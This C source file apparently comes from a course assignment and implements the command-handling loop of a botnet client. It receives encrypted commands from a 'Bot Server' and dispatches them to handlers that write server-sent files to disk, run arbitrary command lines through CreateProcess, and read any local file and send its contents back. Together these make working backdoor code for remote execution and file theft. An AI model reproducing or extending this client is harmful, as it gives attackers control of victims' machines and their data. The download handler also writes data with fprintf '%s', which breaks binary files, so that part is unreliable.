#include "Control.h"
#define DataChunk 1024*100
ControlProtocol ControlTable[ ControlProtocolNum ];

///
/// Download a file from the server, and store it locally.
/// \em args should be the path of file to be created.
/// It expects the server to send another data unit containing 
/// the content of the file.
///
/// \return TRUE on success, FALSE on failure
///
static BOOL do_download(SOCKET * ConnectSocket, char* args, char* key)
{
	// ******* Your Code Here ************ //
	DataUnit du;
	BOOL receiveSuccess = recvEncryptedDataUnit(ConnectSocket,&du,key);
	if(!receiveSuccess)
		return false;
	FILE* file;
	file = fopen(args, "wb");
	if(file == NULL)
		return false;
	fprintf(file, "%s", du.data);
	fclose(file);
	return true;
}

///
/// Expect \em args being a command line.
/// Execute the command asynchronously.
///
/// \return TRUE on success, FALSE on failure
///
static BOOL do_exec(SOCKET * ConnectSocket, char* args, char* key)
{ 
	// ******* Your Code Here ************ //
	STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );

    // Start the child process. 
    if( !CreateProcess( NULL,   // No module name (use command line)
        args,        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi )           // Pointer to PROCESS_INFORMATION structure
    ) 
    {
        printf( "CreateProcess failed (%d).\n", GetLastError() );
        return false;
    }

    // Close process and thread handles. 
    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );
	return true;
	
}

///
/// It expects \em args to be a timestamp like 12345.000.
/// It will send the timestamp back to the server.
///
/// \return TRUE on success, FALSE on failure
///
static BOOL do_checkAlive(SOCKET * ConnectSocket, char* args, char* key)
{
	BOOL success = FALSE;
	DataUnit rdu;
	memset(&rdu, 0, sizeof(rdu));

	//printf("[do_checkAlive] cmd %s ctime %s\n",cmd,ctime);
	rdu.data = (char*)malloc(100);
	if(rdu.data == NULL)
		goto end;
	memset(rdu.data, 0 , 100 );
	_snprintf_s(rdu.data, 100, _TRUNCATE, "%s", args);
	rdu.length = strlen(rdu.data);
	if(!sendEncryptedDataUnit(ConnectSocket, &rdu, key))
		goto end;
	success = TRUE;
end:
	free(rdu.data);
	return success;
}

static long int getFileSize(FILE* file)
{
	const long int fpos = ftell(file);
	if(fpos == -1)
		return -1;
	if(fseek(file, 0, SEEK_END) != 0)
		return -1;
	const long int size = ftell(file);
	if(size == -1)
		return -1;
	if(fseek(file, fpos, SEEK_SET) != 0)
		return -1;
	return size;
}

///
/// Read a local file, and send its content to the server.
/// If the file doesn't exist, or it fails to open the file, 
/// it acts as if the file's content is empty.
/// 
/// \param args file path
///
/// \return TRUE on success, FALSE on failure
///
static BOOL do_readLocalFile(SOCKET * ConnectSocket, char* args, char* key)
{
	BOOL success = FALSE;
	char* buf = NULL;
	FILE* file = NULL;

	DataUnit rdu;
	printf("[do_readFile] filename \"%s\"\n",args);

	file = fopen(args,"rb");
	if(file == NULL)
		goto empty_file;
	long int fsize = getFileSize(file);
	if(fsize == -1)
		goto empty_file;
	buf =(char*)malloc(fsize);
	if(buf == NULL)
		goto empty_file;
	
	size_t nread = fread(buf, 1, fsize, file);
	if(ferror(file))
	{
		puts("Fail to read from the file");
		goto empty_file;
	}
	rdu.data = buf;
	rdu.length = nread;
	if(!sendEncryptedDataUnit(ConnectSocket,&rdu,key))
		goto end;
	success = TRUE;
	goto end;
empty_file:
	rdu.data = "";
	rdu.length = 0;
	if(!sendEncryptedDataUnit(ConnectSocket,&rdu,key))
		goto end;
	success = TRUE;
end:
	free(buf);
	if(file != NULL)
		fclose(file);
	return success;
}

BOOL initializeControl()
{
	ControlTable[ ControlDownload ].ControlRequest = ControlCmdDownload;
	ControlTable[ ControlGetBinary ].ControlRequest = NULL;
	ControlTable[ ControlExec ].ControlRequest = ControlCmdExec;
	ControlTable[ ControlGetID ].ControlRequest = NULL;
	ControlTable[ ControlCheckAlive ].ControlRequest = ControlCmdCheckAlive;
	ControlTable[ ControlReadFile ].ControlRequest = ControlCmdReadFile;
	
	ControlTable[ ControlDownload ].ControlFunction = do_download;
	ControlTable[ ControlGetBinary ].ControlFunction = NULL;
	ControlTable[ ControlExec ].ControlFunction = do_exec;
	ControlTable[ ControlGetID ].ControlFunction = NULL;
	ControlTable[ ControlCheckAlive ].ControlFunction = do_checkAlive;
	ControlTable[ ControlReadFile ].ControlFunction = do_readLocalFile;
	return TRUE;
}

///
/// Get pointer to the start of the next command line element
///
static char* cmdNextElement(char* cmdLine)
{
	char* p = cmdLine;
	while(*p == ' ')
		++p;
	return p;
}

///
/// Chop a comand line into two strings.
///
/// The first string is the command name, and the second string is 
/// the argument list.
/// It write '\0' into the string to break it into two strings.
/// \c *cmd will be stored with the starting address of the first string.
/// \c *args will be stored with the starting address of the second string.
///
static void cmdLineChop(char* cmdLine, char** cmd, char** args)
{
	// Skip leading white space
	*cmd = cmdNextElement(cmdLine);
	char* cmdEnd = strchr(*cmd, ' ');
	if(cmdEnd == NULL)
	{
		*args = *cmd + strlen(*cmd);
		return;
	}
	*args = cmdNextElement(cmdEnd);
	*cmdEnd = '\0';
	return;
}

BOOL Control(SOCKET *ConnectSocket,char* key)
{
	
	printf("Enter Control State\n");
	if(!initializeControl())
		return FALSE;
	while(true)
	{
		DataUnit du;
		BOOL receiveSuccess = recvEncryptedDataUnit(ConnectSocket,&du,key);
		if(!receiveSuccess)
		{
			printf("Disconnect from Bot Server\n");
			break;
		}
		printf("[Control] Receive command: %s\n", du.data);
		char *cmd, *args;
		cmdLineChop(du.data, &cmd, &args);
		int i;
		for(i = 0; i < ControlProtocolNum; ++i)
		{
			if(ControlTable[i].ControlRequest != NULL && 
				strcmp(cmd, ControlTable[i].ControlRequest) == 0)
			{
				BOOL controlSuccess = (*(ControlTable[ i ].ControlFunction))(
							ConnectSocket,
							args,
							key
							);
				if(!controlSuccess)
					puts("[Control] Control command fails");
				break;
			}
		}
		if(i >= ControlProtocolNum)
			puts("[Control] Receive unknown command");
		free(du.data);
	}
	return TRUE;
}
